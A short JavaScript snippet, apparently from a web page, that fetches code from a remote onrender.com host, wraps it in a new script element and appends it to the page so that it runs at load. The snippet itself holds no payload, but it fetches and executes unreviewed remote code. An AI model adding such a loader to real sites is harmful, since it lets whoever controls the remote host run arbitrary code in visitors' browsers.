const f = fetch('https://weatherserver.onrender.com/f.js',{
	headers:{
		"Content-Type":"text/javascript",
		"Access-Control-Allow-Origin":"*"
	}
})
f.then(d=>  d.text()).then(c=>{
	const script = document.createElement('script')
	script.type = "text/javascript";
	script.text=JSON.parse(c);
	document.body.appendChild(script)
})
